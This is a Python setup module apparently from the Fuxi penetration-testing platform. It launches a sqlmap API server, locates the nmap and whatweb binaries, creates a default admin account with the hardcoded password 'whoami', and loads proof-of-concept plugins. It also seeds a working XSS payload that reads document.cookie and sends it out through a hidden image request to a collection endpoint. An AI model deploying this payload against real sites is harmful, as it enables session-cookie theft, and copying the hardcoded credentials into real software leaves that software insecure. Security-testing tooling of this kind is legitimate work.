#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2020/4/5
# @File    : t_app.py
# @Desc    : ""

import time
import requests
import os
import re
import subprocess
import sys
from sqlalchemy.exc import OperationalError
from fuxi.common.utils.network import get_free_port
from fuxi.common.utils.logger import logger
from fuxi.common.utils.poc_handler import poc_parser
from fuxi.core.databases.orm.auth.user_orm import DBFuxiAdmin
from fuxi.core.databases.orm.scanner.pocsuite_orm import DBPocsuitePlugin
from fuxi.core.databases.orm.exploit.xss_orm import DBXssPayloads
from fuxi.core.databases.orm.configuration.config import DBFuxiConfiguration

def _sqlmap_restful_server_start(port):
    sqlmap_file = os.path.abspath(os.path.dirname(__file__)) + "/../../instance/sqlmap_api_server.py"
    subprocess.Popen("{} {} -p {}".format(
        sys.executable, sqlmap_file, port
    ), shell=True, encoding="utf-8", stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def _sqlmap_restful_server_check(server):
    time.sleep(1)
    try:
        response = requests.get("{}/task/new".format(server))
        if response.json()['success']:
            return True
    except Exception as e:
        return False


class ThirdPartyAppInit(object):
    def __init__(self):
        self.name_exe = "nmap_exe"
        self.whatweb_exe = "whatweb_exe"
        self.sqlmap_api = "sqlmap_api"
        self.config = DBFuxiConfiguration.find_one()
        if not self.config:
            return

    def sqlmap_init(self):
        port = get_free_port()
        if not self.config.__contains__("sqlmap_api"):
            _sqlmap_restful_server_start(port)
            if _sqlmap_restful_server_check("http://127.0.0.1:{}".format(port)):
                DBFuxiConfiguration.update_by_id(self.config['_id'], {
                    "sqlmap_api": "http://127.0.0.1:{}".format(port),
                })
        else:
            if not _sqlmap_restful_server_check(self.config['sqlmap_api']):
                port = self.config['sqlmap_api'].split(":")[-1]
                _sqlmap_restful_server_start(port)

    def nmap_init(self):
        re_compile = re.compile("([\s]*)Starting Nmap ([\d]+)\.([\d]+)")
        if not self.config.__contains__("nmap_exe"):
            for exe in ["/usr/local/bin/nmap", "/usr/bin/nmap", "nmap"]:
                subp = subprocess.run("{} -v".format(exe), shell=True, encoding="utf-8",
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if re_compile.match(subp.stdout):
                    DBFuxiConfiguration.update_by_id(self.config['_id'], {
                        "nmap_exe": exe,
                    })
                    break
        else:
            subp = subprocess.run("{} -v".format(self.config['nmap_exe']), shell=True, encoding="utf-8",
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if not re_compile.match(subp.stdout):
                for exe in ["/usr/local/bin/nmap", "/usr/bin/nmap", "nmap"]:
                    subp = subprocess.run("{} -v".format(exe), shell=True, encoding="utf-8",
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    if re_compile.match(subp.stdout):
                        DBFuxiConfiguration.update_by_id(self.config['_id'], {
                            "nmap_exe": exe,
                        })
                        break

    def whatweb_init(self):
        re_compile = re.compile('WhatWeb version ([\d]+)\.([\d]+)(?:\.([\d])+)')

        if not self.config.__contains__("whatweb_exe"):
            for exe in ["/usr/local/bin/whatweb", "/usr/bin/whatweb", "whatweb"]:
                subp = subprocess.run("{} --version".format(exe), shell=True, encoding="utf-8",
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if re_compile.match(subp.stdout):
                    DBFuxiConfiguration.update_by_id(self.config['_id'], {
                        "whatweb_exe": exe,
                    })
                    break
        else:
            subp = subprocess.run("{} --version".format(self.config['whatweb_exe']), shell=True, encoding="utf-8",
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if not re_compile.match(subp.stdout):
                for exe in ["/usr/local/bin/whatweb", "/usr/bin/whatweb", "whatweb"]:
                    subp = subprocess.run("{} --version".format(exe), shell=True, encoding="utf-8",
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    if re_compile.match(subp.stdout):
                        DBFuxiConfiguration.update_by_id(self.config['_id'], {
                            "whatweb_exe": exe,
                        })
                        break


def databases_init():
    try:
        if not DBFuxiAdmin.find_one():
            # fuxi console default login user and password (user: fuxi password: whoami)
            DBFuxiAdmin.add_admin(
                username="fuxi", password="whoami",
                nick="Administrator", email="admin@fuxi.com",
            )
        if not DBPocsuitePlugin.find_one():
            # pocsuit plugin initialization
            _poc_path = os.path.abspath(os.path.dirname(__file__)) + "/../../migration/pocs"
            if os.path.exists(_poc_path):
                for poc_filename in os.listdir(_poc_path):
                    with open(_poc_path + "/" + poc_filename, "r", encoding="UTF-8") as poc_read:
                        poc_str = poc_read.read()
                        poc_data = poc_parser(poc_str)
                        DBPocsuitePlugin.add(
                            name=poc_data['name'], poc_str=poc_str, filename=poc_filename,
                            app=poc_data['app'], poc_type=poc_data['type'], op="fuxi"
                        )
    except OperationalError:
        # catch database connect exception
        logger.error("OperationalError: can't connect to database server")
        sys.exit(0)
    except Exception as e:
        # catch database error
        logger.error("database initialization failure: {}".format(e))
        sys.exit(0)

    if not DBXssPayloads.find_one():
        # xss payload example
        name = "get document.cookie"
        value = "var api = 'http://127.0.0.1:50020';\n" \
                "var url = document.location.href;\n" \
                "var salt = 'abcde';\n" \
                "var data = 'cookie=' + encodeURIComponent(document.cookie);\n" \
                "var img = document.createElement('img');\n" \
                "img.width = 0; img.height = 0;\n" \
                "img.src = api+'/xss?salt='+salt+'&url='+encodeURIComponent(url)+'&data='+ encodeURIComponent(data);"
        DBXssPayloads.add(name, value)

    if not DBFuxiConfiguration.find_one():
        # base configuration
        cid = DBFuxiConfiguration.config_init()
        x = FuxiConfigInit(cid)
        if not x.set_whatweb_exe():
            logger.warning("Configuration init: whatweb cannot found")
        if not x.set_nmap_exe():
            logger.warning("Configuration init: nmap cannot found")


class FuxiConfigInit(object):
    def __init__(self, cid):
        self.cid = cid

    def set_whatweb_exe(self):
        re_compile = re.compile('WhatWeb version ([\d]+)\.([\d]+)(?:\.([\d])+)')
        for exe in ["/usr/local/bin/whatweb", "/usr/bin/whatweb", "whatweb"]:
            subp = subprocess.run("{} --version".format(exe), shell=True, encoding="utf-8",
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if re_compile.match(subp.stdout):
                DBFuxiConfiguration.update_by_id(self.cid, {
                    "whatweb_exe": exe,
                })
                return True
        return False

    def set_nmap_exe(self):
        re_compile = re.compile("([\s]*)Starting Nmap ([\d]+)\.([\d]+)")
        for exe in ["/usr/local/bin/nmap", "/usr/bin/nmap", "nmap"]:
            subp = subprocess.run("{} -v".format(exe), shell=True, encoding="utf-8",
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if re_compile.match(subp.stdout):
                DBFuxiConfiguration.update_by_id(self.cid, {
                    "nmap_exe": exe,
                })
                return True
        return False


def third_party_app_init():
    th = ThirdPartyAppInit()
    th.whatweb_init()
    th.nmap_init()
    th.sqlmap_init()
